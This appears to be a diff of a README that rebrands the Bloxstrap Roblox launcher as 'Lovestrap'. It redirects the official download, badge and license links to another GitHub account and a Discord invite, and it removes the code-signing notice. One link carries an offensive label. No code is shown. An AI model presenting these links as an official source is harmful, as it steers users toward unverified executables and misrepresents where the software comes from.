@@ -37,7 +37,7 @@ Lovestrap is only supported for PCs running Windows.
 
 **Q: Can using this get me banned?**
 
-**A:** No, it shouldn't. Lovestrap doesn't interact with the Roblox client in the same way that exploits do. [Read more about that here.](https://bloxstraplabs.com/wiki/info/bloxstrap-and-bans)
+**A:** No, it shouldn't. Lovestrap doesn't interact with the Roblox client in the same way that exploits do.
 ## Features
 
 - Hassle-free Discord Rich Presence to let your friends know what you're playing at a glance
@@ -46,9 +46,9 @@ Lovestrap is only supported for PCs running Windows.
 - Ability to configure graphics fidelity and UI experience
 
 ## Installing
-Download the [latest release of Lovestrap](https://github.com/bloxstraplabs/bloxstrap/releases/latest), and run it. Configure your preferences if needed, and install. That's about it!
+Download the [latest release of Lovestrap](https://github.com/jacech67/lovestrap/releases), and run it. Configure your preferences if needed, and install. That's about it!
 
-Alternatively, you can install Lovestrap via [Winget](https://winstall.app/apps/pizzaboxer.Bloxstrap) by running this in a Command Prompt window:
+Alternatively, you can install Lovestrap via [discord](https://discord.gg/soarr) by joining the server.
 ```
 > winget install bloxstrap
 ```
@@ -61,27 +61,24 @@ Once installed, Lovestrap is added to your Start Menu, where you can access the 
 
 ## Code
 
-Lovestrap uses the [WPF UI](https://github.com/lepoco/wpfui) library for the user interface design. We currently use and maintain our own fork of WPF UI at [bloxstraplabs/wpfui](https://github.com/bloxstraplabs/wpfui).
+Lovestrap uses the [WPF UI](https://github.com/lepoco/wpfui) library for the user interface design. We currently use and maintain our own fork of WPF UI at [epsteins island](https://discord.gg/soarr).
 
 
-[shield-repo-license]:  https://img.shields.io/github/license/bloxstraplabs/bloxstrap
-[shield-repo-workflow]: https://img.shields.io/github/actions/workflow/status/bloxstraplabs/bloxstrap/ci-release.yml?branch=main&label=builds
-[shield-repo-releases]: https://img.shields.io/github/downloads/bloxstraplabs/bloxstrap/latest/total?color=981bfe
-[shield-repo-latest]:   https://img.shields.io/github/v/release/bloxstraplabs/bloxstrap?color=7a39fb
+[shield-repo-license]:  https://discord.gg/soarr
+[shield-repo-workflow]: https://discord.gg/soarr
+[shield-repo-releases]: https://discord.gg/soarr
+[shield-repo-latest]:   https://discord.gg/soarr
 
-[shield-crowdin-status]: https://badges.crowdin.net/bloxstrap/localized.svg
-[shield-discord-server]: https://img.shields.io/discord/1099468797410283540?logo=discord&logoColor=white&label=discord&color=4d3dff
+[shield-crowdin-status]: https://discord.gg/soarr
+[shield-discord-server]: https://discord.gg/soarr
 [shield-tenor-meme]:     https://img.shields.io/badge/mom_made-pizza_rolls-orange
 
-[repo-license]:  https://github.com/bloxstraplabs/bloxstrap/blob/main/LICENSE
-[repo-actions]:  https://github.com/bloxstraplabs/bloxstrap/actions
-[repo-releases]: https://github.com/bloxstraplabs/bloxstrap/releases
-[repo-latest]:   https://github.com/bloxstraplabs/bloxstrap/releases/latest
+[repo-license]:  https://github.com/jacech67/lovestrap/releases
+[repo-actions]:  https://github.com/jacech67/lovestrap/releases
+[repo-releases]: https://github.com/jacech67/lovestrap/releases
+[repo-latest]:   https://github.com/jacech67/lovestrap/releases
 
-[crowdin-project]: https://crowdin.com/project/bloxstrap
-[discord-invite]:  https://discord.gg/nKjV3mGq6R
+[crowdin-project]: https://discord.gg/soarr
+[discord-invite]:  https://discord.gg/soarr
 [tenor-gif]:       https://media.tenor.com/FIkSGbGycmAAAAAd/manly-roblox.gif
 
-## Code signing policy
-
-Thanks to [SignPath.io](https://signpath.io/) for providing a free code signing service, and the [SignPath Foundation](https://signpath.org/) for providing the free code signing certificate.
